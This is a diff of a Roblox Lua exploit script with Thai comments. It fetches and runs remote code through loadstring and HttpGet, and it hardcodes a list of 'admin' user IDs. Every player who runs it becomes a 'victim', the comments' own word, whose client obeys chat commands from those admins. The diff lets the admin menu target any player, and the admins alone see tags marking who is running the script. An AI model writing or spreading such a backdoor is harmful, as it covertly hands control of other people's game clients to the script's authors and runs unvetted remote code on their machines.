@@ -2,30 +2,22 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- [ รายชื่อแอดมินทั้งหมด ]
+-- [ รายชื่อแอดมิน ]
 local AdminList = {
-    [1697390697] = "OWNER",      -- ตัวน้อง
-    [9802544328] = "ADMIN",      -- เพื่อนคนที่ 1
-    [6030349781] = "ADMIN",      -- เพื่อนคนที่ 2
-    [10339491848] = "ADMIN"      -- เพื่อนคนที่ 3
+    [1697390697] = "OWNER",
+    [9802544328] = "ADMIN",
+    [6030349781] = "ADMIN",
+    [10339491848] = "ADMIN"
 }
 
--- ฟังก์ชันเช็คว่าเป็นแอดมินไหม
-local function IsAdmin(id)
-    return AdminList[id] ~= nil
-end
+local function IsAdmin(id) return AdminList[id] ~= nil end
 
--- [[ ฟังก์ชันสร้างป้ายแบบแยกมุมมอง - กลุ่มแอดมินเท่านั้นที่เห็น ]]
+-- [[ ฟังก์ชันสร้างป้าย (Admin เห็นคนเดียว) ]]
 local function CreateTag(targetPlayer, text, color, trans)
     local function ApplyTag(char)
         local head = char:WaitForChild("Head", 10)
-        if not head then return end
+        if not head or not IsAdmin(LocalPlayer.UserId) then return end
         if head:FindFirstChild("Tag191") then head.Tag191:Destroy() end
-
-        -- *** เฉพาะคนที่เป็นแอดมินเท่านั้นถึงจะมองเห็นป้าย ***
-        if not IsAdmin(LocalPlayer.UserId) then
-            return 
-        end
 
         local bgui = Instance.new("BillboardGui", head)
         bgui.Name = "Tag191"
@@ -47,12 +39,11 @@ local function CreateTag(targetPlayer, text, color, trans)
         label.TextSize = 18
         label.Font = Enum.Font.GothamBold
     end
-
     targetPlayer.CharacterAdded:Connect(ApplyTag)
     if targetPlayer.Character then ApplyTag(targetPlayer.Character) end
 end
 
--- [[ ระบบสั่งการที่จะรันในเครื่องเหยื่อ ]]
+-- [[ ระบบคำสั่งในเครื่องเหยื่อ ]]
 local function RunCommand(cmd)
     local char = LocalPlayer.Character
     local hum = char and char:FindFirstChildOfClass("Humanoid")
@@ -86,10 +77,10 @@ local function RunCommand(cmd)
     end
 end
 
--- [[ ระบบดักฟังแชทจากกลุ่มแอดมิน ]]
+-- [[ ระบบดักฟัง ]]
 local function Listen(player)
     player.Chatted:Connect(function(msg)
-        if IsAdmin(player.UserId) then -- เช็คว่าคนสั่งเป็นหนึ่งในแอดมินไหม
+        if IsAdmin(player.UserId) then
             local args = string.split(msg:lower(), " ")
             if args[2] and string.find(LocalPlayer.Name:lower(), args[2]) then
                 RunCommand(args[1])
@@ -98,7 +89,7 @@ local function Listen(player)
     end)
 end
 
--- [[ แยกส่วนการทำงาน ]]
+-- แยกสถานะ
 local myRole = AdminList[LocalPlayer.UserId]
 if myRole then
     CreateTag(LocalPlayer, myRole, Color3.new(1,1,1), 0.2)
@@ -109,13 +100,13 @@ else
     return 
 end
 
--- [[ ส่วนของ MASTER UI (แอดมินทุกคนเห็นเมนู) ]]
-local Window = Rayfield:CreateWindow({ Name = "191 ADMIN TEAM HUB" })
-local MainTab = Window:CreateTab("Control", 4483362458)
+-- [[ ส่วนเมนูของแอดมิน (โชว์ทุกคนในเซิร์ฟ) ]]
+local Window = Rayfield:CreateWindow({ Name = "191 TEAM MASTER" })
+local MainTab = Window:CreateTab("Player List", 4483362458)
 local Selected = ""
 
 local Dropdown = MainTab:CreateDropdown({
-   Name = "Target (191 Users)",
+   Name = "Select Player (Any)",
    Options = {},
    Callback = function(Option) Selected = Option end,
 })
@@ -123,20 +114,27 @@ local Dropdown = MainTab:CreateDropdown({
 local function Refresh()
     local list = {}
     for _, p in pairs(Players:GetPlayers()) do
-        -- เช็คว่าคนนั้นไม่ใช่แอดมิน และมีป้าย 191 (ที่แอดมินมองเห็น)
-        if not IsAdmin(p.UserId) and p.Character and p.Character:FindFirstChild("Head") and p.Character.Head:FindFirstChild("Tag191") then
-            table.insert(list, p.Name)
+        -- เอารายชื่อทุกคนยกเว้นพวกแอดมินกันเอง (กันกดพลาด)
+        if not IsAdmin(p.UserId) then
+            -- ถ้าคนนั้นรันสคริปต์อยู่ (มีป้าย) จะใส่สัญลักษณ์บอก
+            local tagPrefix = ""
+            if p.Character and p.Character:FindFirstChild("Head") and p.Character.Head:FindFirstChild("Tag191") then
+                tagPrefix = "[191] "
+            end
+            table.insert(list, tagPrefix .. p.Name)
         end
     end
     Dropdown:Set(list)
 end
 
-MainTab:CreateButton({ Name = "Refresh Active Users", Callback = Refresh })
+MainTab:CreateButton({ Name = "Refresh Everyone", Callback = Refresh })
 
 local function Send(c)
     if Selected ~= "" then
+        -- ลบ Prefix [191] ออกก่อนส่งแชทเพื่อให้คำสั่งทำงานถูกต้อง
+        local cleanName = Selected:gsub("%[191%] ", "")
         local chat = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
-        chat:FireServer(c.." "..Selected, "All")
+        chat:FireServer(c.." "..cleanName, "All")
     end
 end
 
@@ -147,3 +145,4 @@ for _, v in pairs(cmds) do
 end
 
 Refresh()
+
